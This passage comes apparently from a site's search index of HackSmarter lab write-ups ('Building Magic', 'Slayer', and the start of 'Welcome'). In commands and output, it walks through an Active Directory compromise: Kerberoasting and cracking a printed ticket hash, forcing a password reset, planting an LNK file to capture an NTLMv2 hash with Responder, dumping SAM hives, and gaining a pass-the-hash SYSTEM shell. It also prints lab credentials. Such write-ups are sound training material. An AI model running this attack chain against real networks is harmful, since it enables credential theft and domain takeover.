      h.grangon                     2025-05-29 21:32:45 0        \nSMB         10.1.142.44     445    DC01             a.flatch                      2025-06-15 02:57:05 0       Project Manager \nSMB         10.1.142.44     445    DC01             [*] Enumerated 8 local users: BUILDINGMAGIC\n\nnxc smb 10.1.142.44 -u r.widdleton -p 'lilronron' --shares\nSMB         10.1.142.44     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)\nSMB         10.1.142.44     445    DC01             [+] BUILDINGMAGIC.LOCAL\\r.widdleton:lilronron \nSMB         10.1.142.44     445    DC01             [*] Enumerated shares\nSMB         10.1.142.44     445    DC01             Share           Permissions     Remark\nSMB         10.1.142.44     445    DC01             -----           -----------     ------\nSMB         10.1.142.44     445    DC01             ADMIN$                          Remote Admin\nSMB         10.1.142.44     445    DC01             C$                              Default share\nSMB         10.1.142.44     445    DC01             File-Share                      Central Repository of Building Magic's files.\nSMB         10.1.142.44     445    DC01             IPC$            READ            Remote IPC\nSMB         10.1.142.44     445    DC01             NETLOGON                        Logon server share \nSMB         10.1.142.44     445    DC01             SYSVOL                          Logon server share\n</code></pre> <p><code>r.widdleton</code> ONLY has access to READ <code>Remote IPC</code></p>"},{"location":"HackSmarter-Labs/buildingmagic/#bloodhound","title":"BloodHound","text":"<p>Looking at <code>r.widdleton</code> user privileges on <code>Bloodhound</code>. He does have <code>NO Outbound Object Control</code>, <code>No path to Domain Admins</code>. Nothing I can use to gain a foothold on the Domain Controller.</p> <p></p>"},{"location":"HackSmarter-Labs/buildingmagic/#kerberoastable-users-impacket-getuserspns","title":"Kerberoastable Users : Impacket-GetUserSPNs","text":"<p>Though I was able to get <code>r.haggard</code> krb5tgs ticket. It is very important to check which user(s) that was used as a Service Account.</p> <pre><code>impacket-GetUserSPNs -request -dc-ip 10.1.142.44 buildingmagic.local/r.widdleton\nImpacket v0.11.0 - Copyright 2023 Fortra\n\nPassword:\nServicePrincipalName                      Name       MemberOf  PasswordLastSet             LastLogon                   Delegation \n----------------------------------------  ---------  --------  --------------------------  --------------------------  ----------\nHOGWARTS-DC/r.hagrid.WIZARDING.THM:60111  r.haggard            2025-05-15 17:09:04.002067  2025-05-15 18:34:51.644710             \n\n[-] CCache file is not found. Skipping...\n$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$buildingmagic.local/r.haggard*$59f4f0560a3b4f0fb0d6ce6a273a11e8$fc76d13822ff9de3b10695216b3e94f7d85d9aa2aa27e7ade5927727986e735f9bd593743f8d22c71c6d28b7213ee41e5dc3e29fe462ae413c4960a3ecda6a6d33b944e76690037c1205e3d97264dfe26c7d0856e9c5e8ae74a46bdc94cf6bcfe2bd76d01f5ca0da808d026252fd8fda09550d34eb6cb20874fcbc3261d410bd7971ffcd4f487d903a5b3fdeb7cf5c8f2e035b580d3006124b5659f070e3f9951a6fc88c429d752944d06563e867304ccbc29a9a13a768a25a83069e70b9681d5fd662bea173bae1fa9ddb14931bf2633c73a63f6fc957a35c1625f78c2c4cc0e3222bd87d31a440c15ba16a1091a12641dc5c5ea817473c0af740d51a22f20bf01e818f2ee880a89ad64e24de29bdcf8ed47be992fac799478192bb457ed69e323e8a867b220e862f9344ea3646560486db93c7ee25455b3c61e39436d7bb55a627a1e8b86ebbfc69081995824a3073ee4940a42a7b33fd8a364b4f05bf02457dd5a574baac6deb69563776effadaf3d6463b11a0a64e8b652504e07b552b7b0007c75da4e5c336dac422be2f1027da54f2a791fb6b2f4365171438d1dab58aac676ecec240f93c4c98aaf95708591b43e6b1894c6eecf20aa49f4261fe4873519a4ef116990d4ffc53dbb341ad78955a027b8355eb90e4bc7e0ab35b69018d21c4ec2947463a2a41d7b2240ee96c360f2b482ef0a9d15289d4bf32ba623f40357c4a0d2295a1780f62ef29fe9638f33488f45e21ec5c076f137cff2d4769eaa39a5ec6d8548a3a9ec3686ff011aee88b073bec059cd12e8c8e2bc9f08d0797ba7b72b753dd94411d3f91402e3a3d51c6bf119b06708e352c1df76e78fe1f67fbe6fd3c5ab1430959a336ce3e45276173167418bf245814323e315c5ced9cf7bc831b93f45f4085a18d7fff24fd55eee47b3d47c50c5c4988ecddc48aa16070a56b621f27c0af03c604fd257d4636f9e221d3036f57a0445401e86b548d776e01db92aa3a5b021cd8f0c765bb8b7762f462b05699fe7b7af59e20e905114a5b6cc93fe8980b080988f55e72724bcb6720411e9c28e014c54e080eff3137a6067f08a10ded57d9ef8af8e6aae5e727f1134ebf6ced42e5d8cba1641cf87cd8a754405dff5f538d2b5e4412ef61b3e5b923759a0bcfddf06dda95f58cb65a8f6b239ef18a64ea9b5273ef12aff34cc097944b4955952220928e02d11561a160ac855531ba64b2e00d2b6f390b9a889b952c26d2716906e988c21162b43382e7edb3735f308d97915d2fae2e8ac40f09114554fcaa406ccdb89a40ecefb96bb8efb7214642ecafdadf9090c8972c25dc27bd16ca781a9cd5b2ec99809536f9c0a3ec51baa60b42857420e83420daa15fe77075a176d0e1062c0192931d25a09a339c196c47bba4a1c228845c963920fe538b1fac70b34292068f00998cc3aaeb1dae5fe236b2c028d808fc2d5f29e39a32df71ae6fdf7aa3e601a3beef74d0d3ddb17af012fa14719bc7e91555a37bd911349c39863e051ece8e88f367b812372fb88b3ca4e0d57a07656513d606e144\n</code></pre> <p>Save to a file <code>krb5t.hash</code> and use <code>John The Ripper</code> to crack it as follows:</p> <pre><code>sudo john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt krb5t.hash\n[sudo] password for parrot: \nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 6 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nrubeushagrid     (?)     \n1g 0:00:00:02 DONE (2025-11-26 22:43) 0.3412g/s 1410Kp/s 1410Kc/s 1410KC/s rubibrian7..rubberduckie8\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>"},{"location":"HackSmarter-Labs/buildingmagic/#creds-obtained","title":"Creds Obtained","text":"<pre><code>r.haggard:rubeushagrid\n</code></pre> <p>Potential Paths for the <code>r.haggard</code> user. <code>R.HAGGARD</code> User to have more permissions that our pervious obtained user (r.widdleton)</p> <pre><code>Building_magic nxc rdp 10.1.142.44 -u r.haggard -p 'rubeushagrid'\nRDP         10.1.142.44     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (nla:True)\nRDP         10.1.142.44     3389   DC01             [+] BUILDINGMAGIC.LOCAL\\r.haggard:rubeushagrid \n\u279c  Building_magic nxc smb 10.1.142.44 -u r.haggard -p 'rubeushagrid'\nSMB         10.1.142.44     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)\nSMB         10.1.142.44     445    DC01             [+] BUILDINGMAGIC.LOCAL\\r.haggard:rubeushagrid \n\u279c  Building_magic nxc smb 10.1.142.44 -u r.haggard -p 'rubeushagrid' --shares\nSMB         10.1.142.44     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)\nSMB         10.1.142.44     445    DC01             [+] BUILDINGMAGIC.LOCAL\\r.haggard:rubeushagrid \nSMB         10.1.142.44     445    DC01             [*] Enumerated shares\nSMB         10.1.142.44     445    DC01             Share           Permissions     Remark\nSMB         10.1.142.44     445    DC01             -----           -----------     ------\nSMB         10.1.142.44     445    DC01             ADMIN$                          Remote Admin\nSMB         10.1.142.44     445    DC01             C$                              Default share\nSMB         10.1.142.44     445    DC01             File-Share                      Central Repository of Building Magic's files.\nSMB         10.1.142.44     445    DC01             IPC$            READ            Remote IPC\nSMB         10.1.142.44     445    DC01             NETLOGON        READ            Logon server share \nSMB         10.1.142.44     445    DC01             SYSVOL          READ            Logon server share \n</code></pre> <p>Looking at <code>Bloodhound</code> the r.haggard user has <code>ForceChangePassword</code> right over <code>h.potch</code> user</p> <p></p> <p>Let\u2019s change the <code>h.potal</code> user password using <code>net rpc</code>.</p> <pre><code>net rpc password \"h.potch\" \"Valentino1@\" -U \"buildingmagic.local\"/\"r.haggard\"%'rubeushagrid' -S \"10.1.142.44\"\n</code></pre> <p>Now with the <code>h.potch</code> password changed, I noticed the user has READ and WRITE access to the <code>File-Share</code> Shares</p> <pre><code>nxc smb 10.1.142.44 -u h.potch -p 'Valentino1@' --shares\nSMB         10.1.142.44     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)\nSMB         10.1.142.44     445    DC01             [+] BUILDINGMAGIC.LOCAL\\h.potch:Valentino1@ \nSMB         10.1.142.44     445    DC01             [*] Enumerated shares\nSMB         10.1.142.44     445    DC01             Share           Permissions     Remark\nSMB         10.1.142.44     445    DC01             -----           -----------     ------\nSMB         10.1.142.44     445    DC01             ADMIN$                          Remote Admin\nSMB         10.1.142.44     445    DC01             C$                              Default share\nSMB         10.1.142.44     445    DC01             File-Share      READ,WRITE      Central Repository of Building Magic's files.\nSMB         10.1.142.44     445    DC01             IPC$            READ            Remote IPC\nSMB         10.1.142.44     445    DC01             NETLOGON        READ            Logon server share \nSMB         10.1.142.44     445    DC01             SYSVOL          READ            Logon server share \n</code></pre> <p><code>An empty</code>File-Share<code>Share, really</code></p> <pre><code>impacket-smbclient h.potch@10.1.142.44\nImpacket v0.11.0 - Copyright 2023 Fortra\n\nPassword:\nType help for list of commands\n# Shares\n*** Unknown syntax: Shares\n# shares\nADMIN$\nC$\nFile-Share\nIPC$\nNETLOGON\nSYSVOL\n# use File-Share\n# ls\ndrw-rw-rw-          0  Wed Nov 26 22:58:53 2025 .\ndrw-rw-rw-          0  Tue Sep  2 15:37:28 2025 ..\n</code></pre> <p>I will use the <code>sneaky-lnk</code> from <code>nxc</code> to add a file in the Share with READ and WRITE Operations. Once accessed would give me the <code>NTLM</code> hash of the user would be captured in the <code>Responder</code> tool.</p> <pre><code>nxc smb 10.1.142.44 -u h.potch -p 'Valentino1@' -M slinky -o NAME=sneaky.lnk SERVER=10.200.21.89 SHARES=File-Share\n[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded\nSMB         10.1.142.44     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)\nSMB         10.1.142.44     445    DC01             [+] BUILDINGMAGIC.LOCAL\\h.potch:Valentino1@ \nSMB         10.1.142.44     445    DC01             [*] Enumerated shares\nSMB         10.1.142.44     445    DC01             Share           Permissions     Remark\nSMB         10.1.142.44     445    DC01             -----           -----------     ------\nSMB         10.1.142.44     445    DC01             ADMIN$                          Remote Admin\nSMB         10.1.142.44     445    DC01             C$                              Default share\nSMB         10.1.142.44     445    DC01             File-Share      READ,WRITE      Central Repository of Building Magic's files.\nSMB         10.1.142.44     445    DC01             IPC$            READ            Remote IPC\nSMB         10.1.142.44     445    DC01             NETLOGON        READ            Logon server share \nSMB         10.1.142.44     445    DC01             SYSVOL          READ            Logon server share \nSLINKY      10.1.142.44     445    DC01             [+] Found writable share: File-Share\nSLINKY      10.1.142.44     445    DC01             [+] Created LNK file on the File-Share share\n</code></pre> <p>Start <code>Responder</code> using the commands: <code>sudo responder -i tun0</code></p> <pre><code>[+] Current Session Variables:\n    Responder Machine Name     [WIN-V0O53Z417SB]\n    Responder Domain Name      [B2HI.LOCAL]\n    Responder DCE-RPC Port     [49666]\n\n[+] Listening for events...\n\n[SMB] NTLMv2-SSP Client   : 10.1.142.44\n[SMB] NTLMv2-SSP Username : BUILDINGMAGIC\\h.grangon\n[SMB] NTLMv2-SSP Hash     : h.grangon::BUILDINGMAGIC:48fb610ce970b961:8770C096C7ABF59AF844045B7A12AFDF:0101000000000000007F2DBF295FDC010453630E167A61030000000002000800420032004800490001001E00570049004E002D00560030004F00350033005A003400310037005300420004003400570049004E002D00560030004F00350033005A00340031003700530042002E0042003200480049002E004C004F00430041004C000300140042003200480049002E004C004F00430041004C000500140042003200480049002E004C004F00430041004C0007000800007F2DBF295FDC010600040002000000080030003000000000000000000000000040000024F9017E10B8E6020144E4B43C89A0160BF73C3DC935B54BA871DDAC22236C8C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E003200300030002E00320031002E00380039000000000000000000\n[*] Skipping previously captured hash for BUILDINGMAGIC\\h.grangon\n[*] Skipping previously captured hash for BUILDINGMAGIC\\h.grangon\n[*] Skipping previously captured hash for BUILDINGMAGIC\\h.grangon\n[*] Skipping previously captured hash for BUILDINGMAGIC\\h.grangon\n[*] Skipping previously captured hash for BUILDINGMAGIC\\h.grangon\n</code></pre> <p>Cracked the <code>NTLMv2</code> hash with John</p> <pre><code>sudo john --format=netntlmv2 ntlm.hash --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 6 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nmagicXXXXX       (h.grangon)     \n1g 0:00:00:00 DONE (2025-11-26 23:23) 1.282g/s 1973Kp/s 1973Kc/s 1973KC/s majko..mafi20\nUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably\nSession completed. \n</code></pre>"},{"location":"HackSmarter-Labs/buildingmagic/#creds-obtained_1","title":"Creds obtained","text":"<pre><code>h.grangon:magicXXXXX\n</code></pre> <p>Let\u2019s confirm credential and access the compromised host</p> <pre><code>nxc smb 10.1.142.44 -u h.grangon -p 'magicXXXXX' \nSMB         10.1.142.44     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)\nSMB         10.1.142.44     445    DC01             [+] BUILDINGMAGIC.LOCAL\\h.grangon:magicXXXXX \n\u279c  ~ nxc winrm 10.1.142.44 -u h.grangon -p 'magicXXXXX'\nWINRM       10.1.142.44     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:BUILDINGMAGIC.LOCAL)\nWINRM       10.1.142.44     5985   DC01             [+] BUILDINGMAGIC.LOCAL\\h.grangon:magicXXXXX (Pwn3d!)\n</code></pre>"},{"location":"HackSmarter-Labs/buildingmagic/#foothold","title":"Foothold","text":"<p>Research findings, data insights, and key considerations and document how you got a foothold on the vulnerable box</p> <pre><code>evil-winrm -i 10.1.142.44 -u h.grangon -p 'magicXXXXX'\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\h.grangon\\Documents&gt; cd ..\\Desktop\n*Evil-WinRM* PS C:\\Users\\h.grangon\\Desktop&gt; dir\n\n    Directory: C:\\Users\\h.grangon\\Desktop\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----          9/2/2025   7:41 PM           2308 Microsoft Edge.lnk\n-a----          9/2/2025   7:41 PM             32 user.txt\n\n*Evil-WinRM* PS C:\\Users\\h.grangon\\Desktop&gt; type user.txt\n701b5XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n</code></pre>"},{"location":"HackSmarter-Labs/buildingmagic/#privilege-escalation","title":"Privilege Escalation","text":"<p>Document how you were able to more laterally and gain a higher privilege</p> <p>Looking at the <code>h.grangon</code> user privileges. He literally has <code>SeBackUpPrivilege</code> which can be used to dump all users credentials.</p> <pre><code>Evil-WinRM* PS C:\\Users\\h.grangon\\Documents&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeBackupPrivilege             Back up files and directories  Enabled ******\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n</code></pre>"},{"location":"HackSmarter-Labs/buildingmagic/#dumping-the-sam-and-system-hives","title":"Dumping the SAM and SYSTEM Hives","text":"<p>I can dump both the <code>system</code> and <code>sam</code> files. They both contain user\u2019s password hashes</p> <pre><code>*Evil-WinRM* PS C:\\Users\\h.grangon\\Documents&gt; reg save hklm\\system .\\system\nThe operation completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\h.grangon\\Documents&gt; reg save hklm\\sam .\\sam\nThe operation completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\h.grangon\\Documents&gt; ls\n\n    Directory: C:\\Users\\h.grangon\\Documents\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        11/26/2025   8:47 PM           3449 EnableAllTokenPrivs.ps1\n-a----        11/26/2025   9:00 PM          49152 sam\n-a----        11/26/2025   9:00 PM       16629760 system\n\n*Evil-WinRM* PS C:\\Users\\h.grangon\\Documents&gt; download system\n\nInfo: Downloading C:\\Users\\h.grangon\\Documents\\system to system\n\nInfo: Download successful!\n*Evil-WinRM* PS C:\\Users\\h.grangon\\Documents&gt; download sam\n\nInfo: Downloading C:\\Users\\h.grangon\\Documents\\sam to sam\n\nInfo: Download successful!\n</code></pre> <p>I got the Administrator hash using <code>secretdump</code></p> <pre><code>impacket-secretsdump -sam sam -system system LOCAL\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Target system bootKey: 0xf61a94fb13f74350a1f87f509c8c455c\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.\n[*] Cleaning up... \n</code></pre> <p>But I couldn\u2019t get a shell with the Administrator\u2019s hash</p> <pre><code>impacket-psexec administrator@10.1.142.44 -hashes aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce \nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)\n</code></pre> <p>So I went back to <code>Bloodhound</code> and found out that <code>a.flatch</code> is also part of the <code>administrators</code> group</p> <p></p> <pre><code>impacket-psexec a.flatch@10.1.142.44 -hashes aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Requesting shares on 10.1.142.44.....\n[*] Found writable share ADMIN$\n[*] Uploading file ZKWrJkPD.exe\n[*] Opening SVCManager on 10.1.142.44.....\n[*] Creating service GEKb on 10.1.142.44.....\n[*] Starting service GEKb.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.20348.587]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; cd C:\\Users\\\n\nC:\\Users&gt; dir\n Volume in drive C has no label.\n Volume Serial Number is 3806-0A24\n\n Directory of C:\\Users\n\n09/02/2025  07:06 PM    &lt;DIR&gt;          .\n09/02/2025  07:06 PM    &lt;DIR&gt;          a.flatch\n09/02/2025  07:37 PM    &lt;DIR&gt;          Administrator\n09/02/2025  06:43 PM    &lt;DIR&gt;          h.grangon\n05/05/2025  01:50 PM    &lt;DIR&gt;          Public\n               0 File(s)              0 bytes\n               5 Dir(s)  34,921,328,640 bytes free\n\nC:\\Users&gt; cd Administrator\\Desktop\n\nC:\\Users\\Administrator\\Desktop&gt; dir\n Volume in drive C has no label.\n Volume Serial Number is 3806-0A24\n\n Directory of C:\\Users\\Administrator\\Desktop\n\n06/12/2025  02:35 PM    &lt;DIR&gt;          .\n09/02/2025  07:40 PM    &lt;DIR&gt;          ..\n06/12/2025  12:37 PM    &lt;DIR&gt;          nssm-2.24\n09/02/2025  03:24 PM                32 root.txt\n               1 File(s)             32 bytes\n               3 Dir(s)  34,921,328,640 bytes free\n\nC:\\Users\\Administrator\\Desktop&gt; type root.txt\n9557e6XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n</code></pre>"},{"location":"HackSmarter-Labs/slayer/","title":"Slayer","text":""},{"location":"HackSmarter-Labs/slayer/#slayer","title":"Slayer","text":"Info <p>Author: Dcyberguy</p> <p>Status: Published</p> <p>Last edited time: November 20, 2025 10:14 PM</p> <p>Created time: November 13, 2025 2:57 PM</p> <p>Tags: Windows</p> <p><code>This is a writeup for the Hacksmarter Lab machine: Slayer</code></p>"},{"location":"HackSmarter-Labs/slayer/#host-information","title":"Host information","text":"<pre><code>- IP Address: ``10.1.246.7``\n- Difficulty: Easy\n- Operating System: Windows\n- Assumed Breach Creds: tyler.ramsey:P@ssw0rd!\n</code></pre>"},{"location":"HackSmarter-Labs/slayer/#enumeration","title":"Enumeration","text":"<pre><code>nmap -A 10.1.246.7 --unprivilege -Pn\nStarting Nmap 7.98 ( https://nmap.org ) at 2025-11-13 12:03 -0800\nNmap scan report for 10.1.246.7\nHost is up (0.027s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n135/tcp  open  msrpc         Microsoft Windows RPC\n445/tcp  open  microsoft-ds?\n3389/tcp open  ms-wbt-server\n|_ssl-date: TLS randomness does not represent time\n| rdp-ntlm-info:\n|   Target_Name: EC2AMAZ-M1LFCNO\n|   NetBIOS_Domain_Name: EC2AMAZ-M1LFCNO\n|   NetBIOS_Computer_Name: EC2AMAZ-M1LFCNO\n|   DNS_Domain_Name: EC2AMAZ-M1LFCNO\n|   DNS_Computer_Name: EC2AMAZ-M1LFCNO\n|   Product_Version: 10.0.26100\n|_  System_Time: 2025-11-13T20:04:31+00:00\n| ssl-cert: Subject: commonName=EC2AMAZ-M1LFCNO\n| Not valid before: 2025-09-29T10:51:47\n|_Not valid after:  2026-03-31T10:51:47\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port3389-TCP:V=7.98%I=7%D=11/13%Time=691639CE%P=i686-pc-windows-windows\nSF:%r(TerminalServerCookie,13,\"\\x03\\0\\0\\x13\\x0e\\xd0\\0\\0\\x124\\0\\x02/\\x08\\0\\\nSF:x02\\0\\0\\0\");\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-11-13T20:04:33\n|_  start_date: N/A\n| smb2-security-mode:\n|   3.1.1:\n|_    Message signing enabled but not required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 89.19 seconds\nCommando VM 11/13/2025 12:05:12\n</code></pre> <p>Three (3) open ports (SMB, MSRPC, RDP)</p>"},{"location":"HackSmarter-Labs/slayer/#smb-enumeration","title":"SMB Enumeration","text":"<p>Read on IPC$ Share is not possible</p> <pre><code>nxc smb 10.1.246.7 -u tyler.ramsey -p 'P@ssw0rd!' --shares\nSMB         10.1.246.7      445    EC2AMAZ-M1LFCNO  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-M1LFCNO) (domain:EC2AMAZ-M1LFCNO) (signing:False) (SMBv1:None)\nSMB         10.1.246.7      445    EC2AMAZ-M1LFCNO  [+] EC2AMAZ-M1LFCNO\\tyler.ramsey:P@ssw0rd!\nSMB         10.1.246.7      445    EC2AMAZ-M1LFCNO  [*] Enumerated shares\nSMB         10.1.246.7      445    EC2AMAZ-M1LFCNO  Share           Permissions     Remark\nSMB         10.1.246.7      445    EC2AMAZ-M1LFCNO  -----           -----------     ------\nSMB         10.1.246.7      445    EC2AMAZ-M1LFCNO  ADMIN$                          Remote Admin\nSMB         10.1.246.7      445    EC2AMAZ-M1LFCNO  C$                              Default share\nSMB         10.1.246.7      445    EC2AMAZ-M1LFCNO  IPC$            READ            Remote IPC\n</code></pre> <p>But we can see the user can rdp onto the affected system</p> <pre><code>nxc rdp 10.1.246.7 -u tyler.ramsey -p 'P@ssw0rd!'\nRDP         10.1.246.7      3389   EC2AMAZ-M1LFCNO  [*] Windows 10 or Windows Server 2016 Build 26100 (name:EC2AMAZ-M1LFCNO) (domain:EC2AMAZ-M1LFCNO) (nla:True)\nRDP         10.1.246.7      3389   EC2AMAZ-M1LFCNO  [+] EC2AMAZ-M1LFCNO\\tyler.ramsey:P@ssw0rd! (Pwn3d!)\n\ueb99 dcyberguy on \uf07b ~\n</code></pre> <p>I will use the Remote Desktop Client</p>"},{"location":"HackSmarter-Labs/slayer/#privilege-escalation","title":"Privilege Escalation","text":"<p>Looking at <code>Powershell history</code>, which is the first place attacker look, you will notice the Administrator ran a command in the Powershell terminal and included his password.</p> <p></p> <p>You can now access the Administrator\u2019s Desktop and get the root flag</p> <p></p>"},{"location":"HackSmarter-Labs/welcome/","title":"Welcome","text":""},{"location":"HackSmarter-Labs/welcome/#welcome","title":"Welcome","text":"<pre><code>**`This is a writeup for the Hacksmarter Lab machine: Welcome`**\n\n- IP Address: ``10.1.93.173``\n- Difficulty: Easy\n- Operating System: Windows\n- Assumed Breach Creds: e.hills:Il0vemyj0b2025!\n</code></pre>"},{"location":"HackSmarter-Labs/welcome/#enumeration-using-nmap","title":"Enumeration Using Nmap","text":"<pre><code>nmap -A 10.1.93.173 --unprivilege -Pn\nStarting Nmap 7.98 ( https://nmap.org ) at 2025-11-13 15:34 -0800\nNmap scan report for 10.1.93.173\nHost is up (0.033s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-13 23:35:25Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC01.WELCOME.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.WELCOME.local\n| Not valid before: 2025-09-13T16:39:47\n|_Not valid after:  2026-09-13T16:39:47\n|_ssl-date: 2025-11-13T23:36:44+00:00; 0s from scanner time.\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)\n|_ssl-date: 2025-11-13T23:36:44+00:00; +1s from scanner time.\n| ssl-cert: Subject: commonName=DC01.WELCOME.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.WELCOME.local\n| Not valid before: 2025-09-13T16:39:47\n|_Not valid after:  2026-09-13T16:39:47\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)\n|_ssl-date: 2025-11-13T23:36:44+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=DC01.WELCOME.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.WELCOME.local\n| Not valid before: 2025-09-13T16:39:47\n|_Not valid after:  2026-09-13T16:39:47\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: WELCOME.local, Site: Default-First-Site-Name)\n|_ssl-date: 2025-11-13T23:36:44+00:00; +1s from scanner time.\n| ssl-cert: Subject: commonName=DC01.WELCOME.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.WELCOME.local\n| Not valid before: 2025-09-13T16:39:47\n|_Not valid after:  2026-09-13T16:39:47\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2025-11-13T23:36:44+00:00; +1s from scanner time.\n| rdp-ntlm-info:\n|   Target_Name: WELCOME\n|   NetBIOS_Domain_Name: WELCOME\n|   NetBIOS_Computer_Name: DC01\n|   DNS_Domain_Name: WELCOME.local\n|   DNS_Computer_Name: DC01.WELCOME.local\n|   Product_Version: 10.0.20348\n|_  System_Time: 2025-11-13T23:36:04+00:00\n| ssl-cert: Subject: commonName=DC01.WELCOME.local\n| Not valid before: 2025-10-27T15:46:43\n|_Not valid after:  2026-04-28T15:46:43\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3.1.1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-11-13T23:36:05\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 122.30 seconds\n</code></pre>"},{"location":"HackSmarter-Labs/welcome/#smb-enumeration","title":"SMB Enumeration","text":"<p>e.hills user do have READ access to the DC01 shared drive</p> <pre><code> nxc smb 10.1.93.173 -u e.hills -p 'Il0vemyj0b2025!' --shares\nSMB         10.1.93.173     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)\nSMB         